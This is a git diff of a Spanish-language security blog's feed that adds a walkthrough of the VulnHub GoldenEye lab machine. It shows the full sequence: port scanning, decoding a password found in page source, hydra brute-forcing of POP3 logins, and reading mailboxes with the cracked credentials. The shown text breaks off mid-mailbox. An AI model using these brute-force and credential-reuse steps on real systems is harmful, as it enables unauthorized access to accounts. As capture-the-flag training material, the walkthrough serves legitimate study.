@@ -1,4 +1,891 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-31T22:46:33-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Jarvis</title><link href="http://localhost:4000/htb-jarvis/" rel="alternate" type="text/html" title="Hack The Box Jarvis" /><published>2021-12-31T00:00:00-06:00</published><updated>2021-12-31T00:00:00-06:00</updated><id>http://localhost:4000/htb-jarvis</id><content type="html" xml:base="http://localhost:4000/htb-jarvis/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/banner-jarvis.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-01T20:39:04-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">VulnHub GoldenEye</title><link href="http://localhost:4000/vh-goldeneye/" rel="alternate" type="text/html" title="VulnHub GoldenEye" /><published>2022-01-01T00:00:00-06:00</published><updated>2022-01-01T00:00:00-06:00</updated><id>http://localhost:4000/vh-goldeneye</id><content type="html" xml:base="http://localhost:4000/vh-goldeneye/">&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/banner-goldeneye.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;goldeneye&quot;&gt;GoldenEye&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.0.0.24 (&lt;strong&gt;Nota&lt;/strong&gt;: La dirección IP cambia de acuerdo a nuestra red y se comparte un link para descargar la máquina virtual &lt;a href=&quot;https://www.vulnhub.com/entry/goldeneye-1,240/&quot;&gt;goldeneye-1&lt;/a&gt;) .&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.0.0.24
+PING 10.0.0.24 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.0.24&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.0.0.24: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.595 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.0.0.24 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0.595/0.595/0.595/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.0.0.24 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-01 14:11 CST
+Initiating ARP Ping Scan at 14:11
+Scanning 10.0.0.24 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 14:11, 0.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 14:11
+Scanning 10.0.0.24 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.0.0.24
+Discovered open port 25/tcp on 10.0.0.24
+Discovered open port 55006/tcp on 10.0.0.24
+Discovered open port 55007/tcp on 10.0.0.24
+Completed SYN Stealth Scan at 14:12, 47.13s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.24
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.013s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65531 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT      STATE SERVICE
+25/tcp    open  smtp
+80/tcp    open  http
+55006/tcp open  unknown
+55007/tcp open  unknown
+MAC Address: 00:0C:29:02:63:89 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;47.34 seconds
+           Raw packets sent: 65536 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.884MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65536 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.621MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.0.0.24
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 25,80,55006,55007
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p25&lt;/span&gt;,80,55006,55007 10.0.0.24 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-01 14:13 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.24
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00029s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
+&lt;/span&gt;80/tcp    open  http        Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: GoldenEye Primary Admin Server
+|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;localhost/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+55007/tcp open  pop3        Dovecot pop3d
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
+|_pop3-capabilities: RESP-CODES USER UIDL TOP AUTH-RESP-CODE SASL&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PLAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; STLS CAPA PIPELINING
+MAC Address: 00:0C:29:02:63:89 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;27.26 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 80 abierto, así que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos en la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.0.0.24/
+http://10.0.0.24/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.0.0.24], Script, Title[GoldenEye Primary Admin Server]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos vemos nada interesante, asi que vamos a ver su contenido vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si checamos el código fuente al sitio web, vemos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;terminal.js&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y si observamos el contenido de dicho archivo, tenemos usuarios potenciales y una contraseña url encodeada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos el usuario &lt;strong&gt;Boris&lt;/strong&gt; y &lt;strong&gt;Natalya&lt;/strong&gt;; además dentro del texto nos indica que se tiene una contraseña cifrada que si buscamos los caracteres separados por punto y coma (;), Google nos transforma a la letra de corresponde, por lo que deberiamos buscar sería  &lt;strong&gt;&lt;em&gt;ampersand hash encoding&lt;/em&gt;&lt;/strong&gt; y vemos que la cadena está cifrada por entidades de HTML por lo que podríamos descifrar mediante algun recurso de internet de URL Encode/Decode.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Adicional, dentro del sitio web nos indica que debemos consulta un recurso bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sev-home/&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entonces ya tenemos unas posibles credenciales y un panel de login, por lo que podríamos tratar de ingresar y como siempre, recordar guardar las credenciales y usuarios que tengamos. Tenemos que la combinación es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;boris : InvincibleHack3r&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/vh-goldeneye/goldeneye-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vemos el código fuente hasta abajo, tenemos una leyenda que nos dice &lt;strong&gt;&lt;em&gt;Qualified GoldenEye Network Operator Supervisors:  Natalya Boris&lt;/em&gt;&lt;/strong&gt;; por lo que ya debemos estar pensando que podrian ser usuarios a nivel de sistema. Nos vemos nada más interesante aquí, así que vamos a pasar por otros puertos que nos dio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; y este caso sería el puerto 55007 asociado al servicio POP3. Si probamos las credenciales que tenemos, no obtenemos ningún resultado, así que vamos a tratar de emplear fuerza bruta para obtener las credenciales para ambos usuarios y para este caso vamos utilizar el diccionario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/wordlists/fasttrack.txt&lt;/code&gt; debido a que la contraseña no aparece en nuestro diccionario de confianza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; boris &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/fasttrack.txt pop3://10.0.0.24 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 55007
+Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2022-01-01 18:13:13
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~14 tries per task
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking pop3://10.0.0.24:55007/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 80.00 tries/min, 80 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 142 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;00:02h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 64.00 tries/min, 128 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:02h, 94 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;00:02h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;55007][pop3] host: 10.0.0.24   login: boris   password: secret1!
+1 of 1 target successfully completed, 1 valid password found
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2022-01-01 18:15:53
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; natalya &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/fasttrack.txt pop3://10.0.0.24 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 55007
+Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2022-01-01 18:18:41
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~14 tries per task
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking pop3://10.0.0.24:55007/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 80.00 tries/min, 80 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 142 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;00:02h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;55007][pop3] host: 10.0.0.24   login: natalya   password: bird
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 111.00 tries/min, 222 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:02h, 1 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;00:01h, 15 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2022-01-01 18:20:41
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya contamos con credeciales de acceso al servicio POP3, así que vamos a echarle un ojito a los correos, primero para el usuario &lt;strong&gt;Boris&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ telnet 10.0.0.24 55007  
+Trying 10.0.0.24...                                             
+Connected to 10.0.0.24.                                         
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                       
++OK GoldenEye POP3 Electronic-Mail System     
+USER boris                                                      
++OK                           
+PASS secret1!
++OK Logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                                   LIST                                                            
++OK 3 messages:
+1 544 
+2 373         
+3 921                        
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                   
+RETR 1                    
++OK 544 octets                                                  
+Return-Path: &amp;lt;root@127.0.0.1.goldeneye&amp;gt;             
+X-Original-To: boris                                            
+Delivered-To: boris@ubuntu                                      
+Received: from ok &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;localhost &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
+        by ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Postfix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;D9E47454B1
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Tue, 2 Apr 1990 19:22:14 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Message-Id: &amp;lt;20180425022326.D9E47454B1@ubuntu&amp;gt;
+Date: Tue, 2 Apr 1990 19:22:14 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+From: root@127.0.0.1.goldeneye
+                                
+Boris, this is admin. You can electronically communicate to co-workers and students here. I&lt;span class=&quot;s1&quot;&gt;'m not going to scan emails for securi
+ty risks because I trust you and the other admins here.
+.                         
+RETR 2                                                          
++OK 373 octets                                                  
+Return-Path: &amp;lt;natalya@ubuntu&amp;gt;                                   
+X-Original-To: boris                                            
+Delivered-To: boris@ubuntu                                      
+Received: from ok (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id C3F2B454B1
+        for &amp;lt;boris&amp;gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: &amp;lt;20180425024249.C3F2B454B1@ubuntu&amp;gt;
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)                                                                                      From: natalya@ubuntu                                                                                                                                                                                                                                              
+Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: &amp;lt;alec@janus.boss&amp;gt;
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+        for &amp;lt;boris&amp;gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: &amp;lt;20180425025235.4B9F4454B1@ubuntu&amp;gt;
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De los correos observados, tenemos otro potencial usuario &lt;strong&gt;Xenia&lt;/strong&gt; el cual podríamos tratar de obtener sus credenciales de acceso a POP3 mediante fuerza bruta; pero antes de eso vamos a ver los correos del usuario &lt;strong&gt;Natalya&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ telnet 10.0.0.24 55007
+Trying 10.0.0.24...
+Connected to 10.0.0.24.   
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
++OK GoldenEye POP3 Electronic-Mail System
+USER natalya                                                    
++OK                                                             
+PASS bird                                                       
++OK Logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                  
+LIST                                                            
++OK 2 messages:  
+1 631
+2 1048                                                                                                                           &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                      
+RETR 1
++OK 631 octets                                                                                                                   Return-Path: &amp;lt;root@ubuntu&amp;gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;localhost &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.0.1]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        by ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Postfix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with ESMTP &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;D5EDA454B1
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;natalya&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Tue, 10 Apr 1995 19:45:33 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Message-Id: &amp;lt;20180425024542.D5EDA454B1@ubuntu&amp;gt;
+Date: Tue, 10 Apr 1995 19:45:33 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+From: root@ubuntu                                               
+                                                                
+Natalya, please you need to stop breaking boris&lt;span class=&quot;s1&quot;&gt;' codes. Also, you are GNO supervisor for training. I will email you once a studen
+t is designated to you.                                         
+                                
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Jan
+us.                                                                                                                              . 
+RETR 2
++OK 1048 octets
